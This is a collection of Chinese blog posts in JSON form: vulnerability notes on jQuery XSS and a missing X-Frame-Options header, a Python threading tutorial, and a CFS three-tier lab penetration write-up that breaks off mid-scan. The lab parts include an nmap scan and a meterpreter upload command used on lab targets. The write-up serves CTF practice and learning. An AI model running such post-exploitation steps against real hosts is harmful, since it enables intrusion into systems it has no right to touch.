修复建议\n目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：[https://jquery.com/](https://jquery.com/)\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n>参考文章：\n>[http://www.word666.com/wangluo/121052.html](http://www.word666.com/wangluo/121052.html)\n>[https://blog.csdn.net/qq_36119192/article/details/89811603](https://blog.csdn.net/qq_36119192/article/details/89811603)\n>[https://www.cnblogs.com/security4399/archive/2013/03/13/2958502.html](https://www.cnblogs.com/security4399/archive/2013/03/13/2958502.html)\n>[http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-582](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-582)\n>[http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-798](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-798)","tags":["jQuery","XSS","漏洞笔记"],"categories":["漏洞笔记"]},{"title":"【漏洞笔记】X-Frame-Options Header未配置","url":"/year/191119-144643.html","content":"# 0x00 概述\n漏洞名称：X-Frame-Options Header未配置\n\n风险等级：低危\n\n问题类型：管理员设置问题\n\n# 0x01 漏洞描述\nX-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在<忽略frame>,<忽略iframe>,<忽略embed>或者<忽略object>中展现的标记。\n\n网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，从而避免点击劫持（clickjacking）攻击。\n\nX-Frame-Options有三个值：\n<!--more-->\n\n### deny\n表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。\n\n### sameorigin\n表示该页面可以在相同域名页面的 frame 中展示。\n\n### allow-from uri\n表示该页面可以在指定来源的 frame 中展示。\n\n换一句话说，如果设置为DENY，不光在别人的网站frame嵌入时会无法加载，在同域名页面中同样会无法加载。\n\n另一方面，如果设置为SAMEORIGIN，那么页面就可以在同域名页面的frame中嵌套。正常情况下我们通常使用SAMEORIGIN参数。\n\n# 0x02 漏洞危害\n攻击者可以使用一个透明的、不可见的iframe，覆盖在目标网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击iframe页面的一些功能性按钮上，导致被劫持。\n\n也就是说网站内容可能被其他站点引用，可能遭受到点击劫持攻击。\n\n# 0x03 修复建议\n### 配置 Apache\n配置 Apache 在所有页面上发送 X-Frame-Options 响应头，需要把下面这行添加到 'site' 的配置中:\n\n```\nHeader always set X-Frame-Options \"sameorigin\"\n```\n要将 Apache 的配置 X-Frame-Options 设置成 deny , 按如下配置去设置你的站点：\n```\nHeader set X-Frame-Options \"deny\"\n```\n要将 Apache 的配置 X-Frame-Options 设置成 allow-from，在配置里添加：\n```\nHeader set X-Frame-Options \"allow-from https://example.com/\"\n```\n### 配置 nginx配置\nnginx 发送 X-Frame-Options 响应头，把下面这行添加到 'http', 'server' 或者 'location' 的配置中:\n\n```\nadd_header X-Frame-Options sameorigin always;\n```\n### 配置 IIS配置\nIIS 发送 X-Frame-Options 响应头，添加下面的配置到 Web.config 文件中：\n\n```\n<system.webServer>\n  ...\n  <httpProtocol>\n    <customHeaders>\n      <add name=\"X-Frame-Options\" value=\"sameorigin\" />\n    </customHeaders>\n  </httpProtocol>\n  ...\n</system.webServer>\n```\n### 配置 HAProxy\n配置 HAProxy 发送 X-Frame-Options 头，添加这些到你的前端、监听 listen，或者后端的配置里面：\n\n```\nrspadd X-Frame-Options:\\ sameorigin\n```\n或者，在更加新的版本中：\n```\nhttp-response set-header X-Frame-Options sameorigin\n```\n### 配置 Express\n要配置 Express 可以发送 X-Frame-Options header，你可以用借助了 frameguard 来设置头部的 helmet。在你的服务器配置里面添加：\n\n```\nconst helmet = require('helmet');\nconst app = express();\napp.use(helmet.frameguard({ action: \"sameorigin\" }));\n```\n或者，你也可以直接用 frameguard：\n```\nconst frameguard = require('frameguard')\napp.use(frameguard({ action: 'sameorigin' }))\n```\n\n>更多信息欢迎关注我的个人微信公众号：TeamsSix\n\n>参考文章：\n>https://blog.whsir.com/post-3919.html\n>https://blog.csdn.net/qq_25934401/article/details/81384876\n>https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options","tags":["漏洞笔记","X-Frame-Options"],"categories":["漏洞笔记"]},{"title":"【Python Threading 学习笔记】6、锁lock","url":"/year/191105-121011.html","content":"往期内容：\n\n[1、什么是多线程？](https://www.teamssix.com/year/1901031-202253.html)\n\n[2、添加线程](https://www.teamssix.com/year/191101-112015.html)\n\n[3、join功能](https://www.teamssix.com/year/191102-102624.html)\n\n[4、Queue功能](https://www.teamssix.com/year/191103-092239.html)\n\n[5、不一定有效率GIL](https://www.teamssix.com/year/191104-101112.html)\n\n# 0x00 关于线程锁lock\n多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。\n\n而使用lock就可以在不同线程使用同一共享内存时，能够确保线程之间互不影响。\n<!--more-->\n# 0x01 不使用lock锁的情况\njob1：全局变量A的值每次加1，循环7次并打印\n```python\ndef job1(): # 全局变量A的值每次加1，循环7次并打印\n   global A\n   for i in range(7):\n      A += 1\n      print('job1',A)\n```\njob2：全局变量A的值每次加10，循环7次并打印\n```python\ndef job2():# 全局变量A的值每次加10，循环7次并打印\n   global A\n   for i in range(7):\n      A += 10\n      print('job2',A)\n```\nmain：定义两个线程并执行job1和job2\n```python\ndef main(): # 定义两个线程并执行job1和job2\n   t1 = threading.Thread(target=job1)\n   t2 = threading.Thread(target=job2)\n   t1.start()\n   t2.start()\n   t1.join()\n   t2.join()\n```\n完整代码：\n```python\nimport threading\n\n\ndef job1(): # 全局变量A的值每次加1，循环7次并打印\n   global A\n   for i in range(7):\n      A += 1\n      print('job1',A)\n\n\ndef job2():# 全局变量A的值每次加10，循环7次并打印\n   global A\n   for i in range(7):\n      A += 10\n      print('job2',A)\n\n\ndef main(): # 定义两个线程并执行job1和job2\n   t1 = threading.Thread(target=job1)\n   t2 = threading.Thread(target=job2)\n   t1.start()\n   t2.start()\n   t1.join()\n   t2.join()\n\n\nif __name__ == '__main__':\n   A = 0\n   main()\n```\n运行结果：\n```bash\n# python 6_lock.py\njob1 1\njob1 2\njob1 3\njob1 4\njob1 5job2 15\njob2 \njob1 2625\njob2\njob1 36 37\njob2 \n47\njob2 57\njob2 67\njob2 77\n```\n可以看到不使用lock的时候，打印的结果很混乱。\n# 0x02 使用lock的情况\n使用lock的方法是， 在每个线程执行运算修改共享内存之前，执行lock.acquire()将共享内存上锁， 确保当前线程执行时，内存不会被其他线程访问，执行运算完毕后，使用lock.release()将锁打开， 保证其他的线程可以使用该共享内存。\n\n为job1和job2加锁：\n```python\ndef job1(): # 全局变量A的值每次加1，循环7次并打印\n   global A,lock\n   lock.acquire() # 上锁\n   for i in range(7):\n      A += 1\n      print('job1',A)\n   lock.release() # 开锁\n\n\ndef job2():# 全局变量A的值每次加10，循环7次并打印\n   global A,lock\n   lock.acquire() # 上锁\n   for i in range(7):\n      A += 10\n      print('job2',A)\n   lock.release() # 开锁\n```\n在程序入口处定义一个lock\n```python\nif __name__ == '__main__':\n   lock = threading.Lock()\n   A = 0\n   main()\n```\n完整代码：\n```python\nimport threading\n\n\ndef job1(): # 全局变量A的值每次加1，循环7次并打印\n   global A,lock\n   lock.acquire()\n   for i in range(7):\n      A += 1\n      print('job1',A)\n   lock.release()\n\n\ndef job2():# 全局变量A的值每次加10，循环7次并打印\n   global A,lock\n   lock.acquire()\n   for i in range(7):\n      A += 10\n      print('job2',A)\n   lock.release()\n\n\ndef main(): # 定义两个线程并执行job1和job2\n   t1 = threading.Thread(target=job1)\n   t2 = threading.Thread(target=job2)\n   t1.start()\n   t2.start()\n   t1.join()\n   t2.join()\n\n\nif __name__ == '__main__':\n   lock = threading.Lock()\n   A = 0\n   main()\n```\n运行结果：\n```bash\n# python 6_lock.py\njob1 1\njob1 2\njob1 3\njob1 4\njob1 5\njob1 6\njob1 7\njob2 17\njob2 27\njob2 37\njob2 47\njob2 57\njob2 67\njob2 77\n```\n从运行结果来看，使用lock后，一个线程一个线程的执行完，两个线程之间互不影响。\n至此，整个【Python Threading 学习笔记】系列更新完毕。\n\n>代码项目地址：[https://github.com/teamssix/Python-Threading-study-notes](https://github.com/teamssix/Python-Threading-study-notes)\n>参考文章：\n>1、[https://www.jianshu.com/p/05b6a6f6fdac](https://www.jianshu.com/p/05b6a6f6fdac)\n>2、[https://morvanzhou.github.io/tutorials/python-basic/threading](https://morvanzhou.github.io/tutorials/python-basic/threading)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","学习笔记","多线程"],"categories":["Python Threading 多线程学习笔记"]},{"title":"【Python Threading 学习笔记】5、不一定有效率GIL","url":"/year/191104-101112.html","content":"往期内容：\n\n[1、什么是多线程？](https://www.teamssix.com/year/1901031-202253.html)\n\n[2、添加线程](https://www.teamssix.com/year/191101-112015.html)\n\n[3、join功能](https://www.teamssix.com/year/191102-102624.html)\n\n[4、Queue功能](https://www.teamssix.com/year/191103-092239.html)\n\n# 0x00 关于GIL\nGIL的全称是Global Interpreter Lock(全局解释器锁)，来源是python设计之初的考虑，为了数据安全所做的决定。\n<!--more-->\n每个CPU在同一时间只能执行一个线程（在单核CPU下的多线程其实都只是并发，不是并行，并发和并行从宏观上来讲都是同时处理多路请求的概念。但并发和并行又有区别，并行是指两个或者多个事件在同一时刻发生；而并发是指两个或多个事件在同一时间间隔内发生。）\n\n在Python多线程下，每个线程的执行方式如下：\n\n1.获取GIL\n\n2.执行代码直到sleep或者是python虚拟机将其挂起。\n\n3.释放GIL\n\n可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。\n\n也就是说尽管Python支持多线程，但是因为GIL的存在，使得Python还是一次性只能处理一个东西，那是不是说Python中的多线程就完全没用了呢，当然不是的。\n\nGIL往往只会影响到那些严重依赖CPU的程序，比如各种循环处理、计数等这种CPU密集型的程序；如果程序中大部分只会涉及到I/O，比如文件处理、网络爬虫等这种IO密集型的程序，那么多线程就能够有效的提高效率，因为在爬虫的时候大部分时间都在等待。\n\n实际上，你完全可以放心的创建几千个Python线程， 现代操作系统运行这么多线程没有任何压力，没啥可担心的。\n\n# 0x01 测试GIL\n```python\nimport copy\nimport time\nimport requests\nimport threading\nfrom queue import Queue\n\ndef job(lists,q):\n   res = sum(lists)\n   q.put(res)\n\n\ndef multithreading(lists):\n   q = Queue()\n   threads_list = []\n\n   for i in range(4):\n      t = threading.Thread(target=job,args=(copy.copy(lists),q),name = '任务 %i' % i)\n      t.start()\n      threads_list.append(t)\n   for t in threads_list:\n      t.join()\n\n   total = 0\n   for _ in range(4):\n      total += q.get()\n   print('使用线程运算结果:',total)\n\n\ndef normal(lists):\n   total = sum(lists)\n   print('不使用线程运算结果:',total)\n\n\ndef req_job(i):\n   requests.get(i)\n\n\ndef req_multithreading(req_lists):\n   threads_list = []\n\n   for i in range(4):\n      t = threading.Thread(target=req_job,args=(req_lists[i],),name='爬虫任务 %i' % i)\n      t.start()\n      threads_list.append(t)\n   for t in threads_list:\n      t.join()\n\n\ndef req_normal(req_lists):\n   for i in req_lists:\n      requests.get(i)\n\n\nif __name__ == '__main__':\n   lists = list(range(1000000)) # 完成一个较大的计算\n   req_lists = ['https://www.teamssix.com','https://github.com/teamssix','https://me.csdn.net/qq_37683287','https://space.bilibili.com/148389186']\n   start_time = time.time()\n   multithreading(lists)\n   print('计算使用线程耗时:', time.time() - start_time,'\\n')\n\n   start_time = time.time()\n   normal(lists * 4)\n   print('计算不使用线程耗时:', time.time() - start_time,'\\n')\n   start_time = time.time()\n   req_multithreading(req_lists)\n   print('爬虫使用线程耗时:', time.time() - start_time)\n   start_time = time.time()\n   req_normal(req_lists)\n   print('爬虫不使用线程耗时:', time.time() - start_time)\n```\n运行结果：\n```bash\n# python 5_GIL.py\n使用线程运算结果: 1999998000000\n计算使用线程耗时: 0.39594030380249023 \n\n不使用线程运算结果: 1999998000000\n计算不使用线程耗时: 0.3919515609741211\n\n爬虫使用线程耗时: 2.2410056591033936\n爬虫不使用线程耗时: 7.1159656047821045\n```\n可以看到在计算程序的代码中不使用线程和使用线程的运算结果是相同的，说明不使用线程和使用线程的程序都进行了一样多次的运算，但是很明显可以看到计算的耗时并没有少很多，按照预期我们使用了4个线程，应该会快近4倍才对，这就是因为GIL在作怪。\n与此同时，可以看到在使用request对一个url发起get请求的时候，使用线程比不使用线程快了3倍多，也进一步的反映出在使用Python进行爬虫的时候，多线程确实可以很大程度上提高效率，但是在进行密集计算任务的时候，多线程就显得很鸡肋了。\n\n>代码项目地址：[https://github.com/teamssix/Python-Threading-study-notes](https://github.com/teamssix/Python-Threading-study-notes)\n>参考文章：\n>1、[https://zhuanlan.zhihu.com/p/20953544](https://zhuanlan.zhihu.com/p/20953544)\n>2、[https://morvanzhou.github.io/tutorials/python-basic/threading](https://morvanzhou.github.io/tutorials/python-basic/threading)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","学习笔记","多线程"],"categories":["Python Threading 多线程学习笔记"]},{"title":"【Python Threading 学习笔记】4、Queue功能","url":"/year/191103-092239.html","content":"往期内容：\n\n[1、什么是多线程？](https://www.teamssix.com/year/1901031-202253.html)\n\n[2、添加线程](https://www.teamssix.com/year/191101-112015.html)\n\n[3、join功能](https://www.teamssix.com/year/191102-102624.html)\n\n# 0x00 关于Queue\nqueue模块实现了各种【多生产者-多消费者】队列，可用于在执行的多个线程之间安全的交换信息。\n<!--more-->\n**queue的常用方法：**\n\n```\nq.size()：返回队列的正确大小。因为其他线程可能正在更新此队列，所以此方法的返回数字不可靠。\n\nq.empty()：如果队列为空，返回True，否则返回False。\n\nq.full()：如果队列已满，返回True，否则返回False。\n\nq.put(item,block,timeout)：将item放入队列。\n如果block设为True（默认值），调用者将被阻塞直到队列中出现可用的空闲位置为止。\n如果block设为False，队列满时此方法将引发Full异常。\n\nq.put_nowait(item):等价于q.put(item,False)\n\nq.get(block,timeout):从队列中删除一项，然后返回这个项。\n如果block设为True（默认值），调用者将阻塞，直到队列中出现可用的空闲为止。\n如果block设为False，队列为空时将引发Empty异常。\ntimeout提供可选的超时值，单位为秒，如果超时，将引发Empty异常。\n\nq.get_nowait()：等价于get(0)\n\nq.task_done():在队列中数据的消费者用来指示对于项的处理已经结束。如果使用此方法，那么从队列中删除的每一项都应该调用一次。\n\nq.join()：阻塞直到队列中的所有项均被删除和处理为止。一旦为队列中的每一项都调用了一次q.task_done()方法，此方法将会直接返回。\n```\n# 0x01 本节代码实现功能\n将数据列表中的数据传入，使用三个线程处理，将结果保存在Queue中，线程执行完后，从Queue中获取存储的结果。\n\n# 0x02导入线程,队列的标准模块\n```python\nimport time\nimport threading\nfrom queue import Queue\n```\n# 0x03 定义一个被多线程调用的函数\n该函数的参数是一个列表lists和一个队列q，其功能是对lists列表中的元素除2取整，之后利用q.put()将结果保存在队列q中。\n\n```python\ndef job(lists,q): # 被调用函数\n    for i in range(len(lists)):\n        lists[i] = lists[i]//2 # lists元素除2取整\n    q.put(lists) # 多线程调用的函数不能用return返回值\n```\n# 0x04 定义一个多线程函数\n在多线程函数中定义一个Queue用来保存返回值代替return，同时定义一个多线程列表，初始化一个多维数据列表用来传入上面的job()函数。\n\n```python\ndef multithreading(): # 调用多线程的函数\n    q = Queue() # 存放job()函数的返回值\n    thread_list = []\n    data = [[1],[2,3],[4,5,6]]\n```\n定义三个线程，启动线程并分别join三个线程到主线程\n```python\nfor i in range(3): # 定义三个线程\n    t = threading.Thread(target=job,args=(data[i],q))\n    t.start()\n    thread_list.append(t) # 将线程添加到thread_list列表中 \nfor thread in thread_list:\n    thread.join()\n```\n定义一个空的result_list列表，将队列q中的数据添加到列表中并print\n```python\nresult_list = []\nfor j in range(3): # 循环三次\n    result_list.append(q.get())\n    print(result_list[j])\n```\n# 0x05 完整的代码\n```python\nimport time\nimport threading\nfrom queue import Queue\n\n\ndef job(lists,q): # 被调用函数\n    for i in range(len(lists)):\n        lists[i] = lists[i]//2 # lists元素除2取整\n    q.put(lists) # 多线程调用的函数不能用return返回值\n\n\ndef multithreading(): # 调用多线程的函数\n    q = Queue() # 存放job()函数的返回值\n    thread_list = []\n    data = [[1],[2,3],[4,5,6]]\n\n    for i in range(3): # 定义三个线程\n        t = threading.Thread(target=job,args=(data[i],q))\n        t.start()\n        thread_list.append(t) # 将线程添加到thread_list列表中\n    for thread in thread_list:\n        thread.join()\n\n    result_list = []\n    for j in range(3): # 循环三次\n        result_list.append(q.get())\n        print(result_list[j])\n\n\nif __name__ == '__main__':\n    multithreading()\n```\n运行结果：\n```bash\n# python 4_queue.py\n[0]\n[1, 1]\n[2, 2, 3]\n```\n>代码项目地址：[https://github.com/teamssix/Python-Threading-study-notes](https://github.com/teamssix/Python-Threading-study-notes)\n>参考文章：\n>1、[https://segmentfault.com/a/1190000016330288](https://segmentfault.com/a/1190000016330288)\n>2、[https://morvanzhou.github.io/tutorials/python-basic/threading](https://morvanzhou.github.io/tutorials/python-basic/threading)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","学习笔记","多线程"],"categories":["Python Threading 多线程学习笔记"]},{"title":"【Python Threading 学习笔记】3、join功能","url":"/year/191102-102624.html","content":"往期内容：\n\n[1、什么是多线程？](https://www.teamssix.com/year/1901031-202253.html)\n\n[2、添加线程](https://www.teamssix.com/year/191101-112015.html)\n\n# 0x00 不使用join()的结果\n首先在上一节的示例基础上进行简单修改\n<!--more-->\n```python\nimport time\nimport threading\n\ndef thread_jobs():  # 定义要添加的线程\n    print('任务1开始\\n')\n    for i in range(10):\n        time.sleep(0.1)\n    print('任务1结束\\n')\n    \ndef main():\n    thread = threading.Thread(target=thread_jobs,name='任务1')  # 定义线程\n    thread.start()  # 开始线程\n    print('所有任务已完成\\n')\n\nif __name__ == '__main__':\n    main()\n```\n预计输出结果：\n```bash\n# python 3_join.py\n任务1开始\n任务1结束\n所有任务已完成\n```\n实际输出结果：\n```bash\n# python 3_join.py\n任务1开始\n所有任务已完成\n任务1结束\n```\n可以看到在线程还没有结束的时候，程序就开始运行之后的代码了，也就是说线程和其他部分的程序都是同步进行的，如果想要避免这种情况，想要程序按照代码顺序执行的话，就需要用到join功能。\n# 0x01 使用join()的结果\n在源代码thread.start()下加入thread.join()即可，原来代码的main函数就变成这样：\n\n```python\ndef main():\n    thread = threading.Thread(target=thread_jobs,name='任务1')  # 定义线程\n    thread.start()  # 开始线程\n    thread.join() #加入join功能\n    print('所有任务已完成\\n')\n```\n这里就表示必须要等到任务1这个线程结束后，才能执行thread.join()之后的代码，代码运行结果如下：\n```bash\n# python 3_join.py\n任务1开始\n任务1结束\n所有任务已完成\n```\n使用join控制多个线程的执行顺序很关键。\n# 0x02 添加第2个线程\n这时如果我们加入第2个线程，但是不加入join功能，看看又是什么样，第2个线程的任务量较小，因此比第1个线程会更快执行，加入的第2个线程如下：\n\n```python\ndef thread_jobs2(): # 定义第2个线程\n    print('任务2开始\\n')\n    print('任务2结束\\n')\n```\n输出的一种结果：\n```bash\n# python 3_join.py\n任务1开始\n任务2开始\n任务2结束\n所有任务已完成\n任务1结束\n```\n注意这个时候任务1和任务2都没有添加join，也就是说输出的内容是什么完全看谁执行的快，谁先执行完谁就先输出，因此这里的输出结果并不唯一，这种杂乱的输出方式是不能接收的，所以需要使用join来控制。\n# 0x03 在不同位置使用join()的结果\n如果在任务2开始前只对任务1加入join功能：\n\n```python\nthread.start()  # 开始线程1\nthread.join()  # 对任务1加入join功能\nthread2.start() # 开始线程2\nprint('所有任务已完成\\n')\n```\n其输出结果如下：\n```bash\n# python 3_join.py\n任务1开始\n任务1结束\n任务2开始\n任务2结束\n所有任务已完成\n```\n可以看到程序会先执行任务1再执行接下来的操作，如果在任务2开始后只对任务1加入join功能：\n```python\nthread.start()  # 开始线程1\nthread2.start() # 开始线程2\nthread.join()  # 对任务1加入join功能\nprint('所有任务已完成\\n')\n```\n其输出结果如下：\n```bash\n# python 3_join.py\n任务1开始\n任务2开始\n任务2结束\n任务1结束\n所有任务已完成\n```\n任务1先于任务2启动，但由于任务2的处理时间较短，因此先于任务1完成，而由于任务1加入了join，因此“所有任务已完成”也在任务1完成后再显示。\n# 0x04 最终代码及输出结果\n如果只对任务2加入join，同样输出结果就是要先等任务2执行完再执行其他程序，但是为了避免不必要的麻烦，推荐下面这种1221的V型排布，毕竟如果每个线程start()后就加入其join()，那就和单线程无异了。\n\n```python\nthread.start()  # 开始线程1\nthread2.start() # 开始线程2\nthread2.join()  # 对任务2加入join功能\nthread.join()  # 对任务1加入join功能\n```\n最终完整代码及输出结果如下：\n```python\nimport time\nimport threading\n\ndef thread_jobs():  # 定义第1个线程\n    print('任务1开始\\n')\n    for i in range(10):\n        time.sleep(0.1)\n    print('任务1结束\\n')\n\ndef thread_jobs2(): # 定义第2个线程\n    print('任务2开始\\n')\n    print('任务2结束\\n')\n\ndef main():\n    thread = threading.Thread(target=thread_jobs,name='任务1')  # 定义线程1\n    thread2 = threading.Thread(target=thread_jobs2, name='任务2')  # 定义线程2\n    thread.start()  # 开始线程1\n    thread2.start() # 开始线程2\n    thread2.join()  # 对任务2加入join功能\n    thread.join()  # 对任务1加入join功能\n    print('所有任务已完成\\n')\n\nif __name__ == '__main__':\n    main()\n```\n输出结果：\n```bash\n# python 3_join.py\n任务1开始\n任务2开始\n任务2结束\n任务1结束\n所有任务已完成\n```\n>参考文章：[https://morvanzhou.github.io/tutorials/python-basic/threading](https://morvanzhou.github.io/tutorials/python-basic/threading)\n>代码项目地址：[https://github.com/teamssix/Python-Threading-study-notes](https://github.com/teamssix/Python-Threading-study-notes)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","学习笔记","多线程"],"categories":["Python Threading 多线程学习笔记"]},{"title":"【Python Threading 学习笔记】2、添加线程","url":"/year/191101-112015.html","content":"往期内容：\n[1、什么是多线程？](https://www.teamssix.com/year/1901031-202253.html)\n\n这一节主要学习Threading模块的一些基本操作，如获取线程数，添加线程等。\n<!--more-->\n首先导入Threading模块\n\n```python\nimport threading\n```\n获取已激活的线程数\n\n```python\nthreading.active_count()\n```\n查看所有线程信息\n\n```python\nthreading.enumerate()\n```\n查看现在正在运行的线程\n\n```python\nthreading.current_thread()\n```\n添加线程，threading.Thread()接收参数target代表这个线程要完成的任务，需自行定义\n\n```python\nimport threading\ndef thread_jobs():  # 定义要添加的线程\n    print('已激活的线程数： %s' % threading.active_count())\n    print('所有线程信息： %s' % threading.enumerate())\n    print('正在运行的线程： %s' % threading.current_thread())\ndef main():\n    thread = threading.Thread(target=thread_jobs, )  # 定义线程\n    thread.start()  # 开始线程\n\nif __name__ == '__main__':\n    main()\n```\n运行结果：\n```bash\n# python 2_add_thread.py\n已激活的线程数： 2\n所有线程信息： [<_MainThread(MainThread, stopped 16800)>, <Thread(Thread-1, started 20512)>]\n正在运行的线程 <Thread(Thread-1, started 20512)>\n```\n>代码项目地址：[https://github.com/teamssix/Python-Threading-study-notes](https://github.com/teamssix/Python-Threading-study-notes)\n>参考文章：[https://morvanzhou.github.io/tutorials/python-basic/threading](https://morvanzhou.github.io/tutorials/python-basic/threading)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","学习笔记","多线程"],"categories":["Python Threading 多线程学习笔记"]},{"title":"【Python Threading 学习笔记】1、什么是多线程？","url":"/year/1901031-202253.html","content":"多线程类似于同时执行多个不同程序，比如一个很大的数据，直接运行的话可能需要10秒钟才能运行完。\n<!--more-->\n但如果使用Threading或者说使用多线程，我们把数据分成5段，每一段数据都放到一个单独的线程里面运算，所有线程同时开始。\n\n这就好比原本一个工作只有一个人在做，但现在有了5个人同时在做，很明显可以大大的提高效率，节省时间。\n\n如果平时有用过IDM下载东西的小伙伴，在下载文件的时候可以打开显示细节，就可以看到多个线程同时下载，传输速度基本能达到本地带宽的最高速度，下图可以很直观的看到多个线程同时下载的过程。\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/Threading1.gif)\n\n>参考文章：https://morvanzhou.github.io/tutorials/python-basic/threading\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["Python","学习笔记","多线程"],"categories":["Python Threading 多线程学习笔记"]},{"title":"【续】CFS三层靶机中的Flag位置及其获取","url":"/year/191021-213828.html","content":"# 0x00 前言\n最近写了一篇《CFS三层靶机搭建及其内网渗透》的文章，里面满满的干货，本篇文章需要结合《CFS三层靶机搭建及其内网渗透》一起看，这篇文章可以在本文底部找到阅读链接。\n<!--more-->\n# 0x01 Target1\n1、系统根目录下\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag1.png)\n\n2、网站根目录下\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag2.png)\n\n3、网站robots.txt文件中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag3.png)\n\n# 0x02 Target2\n1、系统根目录下\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag4.png)\n\n2、日志文件中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag5.png)\n\n3、passwd文件中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag6.png)\n\n4、crontab文件中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag7.png)\n\n5、网站根目录下\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag8.png)\n\n6、管理后台中\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag9.png)\n\n# 0x03 Target3\n1、通过meterpreter上传Everything工具并安装\n\n```bash\nmeterpreter > upload ./Everything_64.exe C:\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag10.png)\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag11.png)\n\n2、利用Everything，直接搜索flag文件\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag12.png)\n\n3、找到两处flag，继续找寻发现计划任务中存在第三处flag\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag13.png)\n\n4、最后一处在事件日志的注册表中被找到\n\n```\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Eventlog\n```\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/flag14.png)\n\n>《CFS三层靶机搭建及其内网渗透》文章地址：\n>1、首发地址：https://www.anquanke.com/post/id/187908\n>2、博客地址：https://www.teamssix.com/year/191021-211425.html\n\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png)","tags":["内网渗透","CFS","比赛"],"categories":["实例演示"]},{"title":"CFS三层靶机搭建及其内网渗透【附靶场环境】","url":"/year/191021-211425.html","content":">本文首发地址：https://www.anquanke.com/post/id/187908\n# 0x00 前言\n最近要参加的一场CTF线下赛采用了CFS靶场模式，听官方说CFS靶场就是三层靶机的内网渗透，通过一层一层的渗透，获取每个靶机的flag进行拿分，那么先自己搭建一个练练手吧，三层靶机的OVA文件下载地址可以在我的公众号“TeamsSix”回复“CFS”以获取。\n<!--more-->\n在这三台主机中，每台我都放了多个flag，本文将只讲述每个靶机的攻击过程，对于flag的获取不做讨论，这点需要读者自己动手找到这些flag，如果你想知道自己找到的flag是否正确且齐全，同样可以在我的公众号“TeamsSix”回复“flag”以获取。\n# 0x01 环境搭建\n简单对主机搭建的环境画了个网络拓扑，攻击机的网段在192.168.1.1/24，三台靶机的IP地址分别如图 1所示。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS1.png)\n图 1\n\nVmware的3个网卡分别配置为桥接，仅主机和仅主机，具体子网地址如图 2所示。\n![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/CFS2.png)\n图 2\n\n如果你想在自己的电脑上搭建此靶场的话，需要先将自己Vmware中的虚拟网络编辑器编辑成图 2的样子，之后将三个靶机的OVA文件导入到自己的VMware中即可，这三个虚拟机的IP地址我都已经手动分配成了图 1的样子。\n>注意：这里桥接模式的网卡设置成自己能联网的网卡即可，因为我发现设置成自动有时会存在虚拟机连不上外网的情况。\n# 0x02 Target1\n## a、获取shell\n1、先用nmap扫描一下Target1\n```bash\nroot@kali:~# nmap -T4 -O 192.168.1.11\nStarting Nmap 7.80 ( https://nmap.org ) at 2019-10-04 05:51 EDT\nNmap scan report for 192.168.1.11\nHost is up (0.00042s latency).\nNot shown: 994 filtered ports\nPORT     STATE  SERVICE\n20/tcp   closed ftp-data\n21/tcp   open   ftp\n22/tcp   open   ssh\n80/tcp   open   http\n888/tcp  open   accessbuilder\n8888/tcp open   sun-answerbook\nMAC Address: 00:0C:29:81:A6:6D (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.10 - 4.11\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.97 